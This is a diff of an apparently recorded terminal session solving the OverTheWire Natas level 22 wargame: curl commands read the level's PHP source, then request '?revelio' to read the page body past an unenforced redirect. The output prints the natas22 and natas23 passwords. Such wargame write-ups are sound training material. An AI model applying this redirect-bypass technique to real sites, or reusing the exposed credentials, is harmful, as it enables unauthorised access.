@@ -1,7 +1,11 @@
-{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793507120,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L22.sh","title":"Natas L22 -> natas23: ?revelio GET parameter prints credentials","env":{"SHELL":"/bin/bash"}}
-[0.002, "o", "$ curl -s -u natas22:<pw> http://natas22.natas.labs.overthewire.org/index-source.html\r\n$   source: if(array_key_exists(\"revelio\", $_GET)) print credentials\r\n"]
-[0.955, "o", "if(array_key_exists(\"revelio\", $_GET)) {    // only admins can reveal the password    if(!($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1)) {    header(\"Location: /\");    }\r\nif(array_key_exists(\"revelio\", $_GET)) {    print \"You are an admin. The credentials for the next level are:<br>\";    print \"<pre>Username: natas23\\n\";    print \"Password: <censored></pre>\";    }\r\n"]
-[0.000, "o", "$ just add ?revelio to the query string\r\n"]
-[0.384, "o", "You are an admin. The credentials for the next level are:Username: natas23\r\nPassword: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5\r\n"]
-[0.000, "o", "$ verify: curl -u natas23:<pw> http://natas23.natas.labs.overthewire.org/ -> 200\r\n"]
-[0.000, "x", "0"]
+{"version": 2, "width": 80, "height": 24, "timestamp": 1795490721, "env": {"SHELL": "/bin/bash", "TERM": "xterm"}}
+[0.010467, "o", "\u001b[?2004hbash-5.2$ "]
+[1.01363, "o", "export PS1='shell$ '\r\r\n\u001b[?2004l\r\u001b[?2004hshell$ "]
+[2.618527, "o", "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF http://natas22.natas.labs.overthewire.org/index-source.html | sed 's/&nbsp;/ /g; s/<[^>]*>//g; s/&lt;/</g; s/&gt;/>/g' | tr -d '\\n' | grep -o 'if(array_key_exists(\"revelio\"[^}]*}'\r\r\n\u001b[?2004l\r"]
+[3.317621, "o", "if(array_key_exists(\"revelio\", $_GET)) {    // only admins can reveal the password    if(!($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1)) {    header(\"Location: /\");    }\r\r\nif(array_key_exists(\"revelio\", $_GET)) {    print \"You are an admin. The credentials for the next level are:<br>\";    print \"<pre>Username: natas23\\n\";    print \"Password: <censored></pre>\";    }\r\r\n"]
+[3.317692, "o", "\u001b[?2004hshell$ "]
+[3.318188, "o", "curl -s -u natas22:964laB0r7TuDqJj5b3HFtwsQoc0GhjBF \"http://natas22.natas.labs.overthewire.org/?revelio\" | sed 's/<[^>]*>//g' | grep -aE \"Username|Password\"\r\r\n\u001b[?2004l\r"]
+[3.85622, "o", "You are an admin. The credentials for the next level are:Username: natas23\r\r\nPassword: CH1OBxJy8uAxMM15Nx6VXSMwcJbBbnS5\r\r\n\u001b[?2004hshell$ "]
+[3.856281, "o", "exit\r\r\n\u001b[?2004l\r"]
+[3.856763, "o", "exit\r\r\n"]
+[3.856815, "o", "exit\r\r\n"]
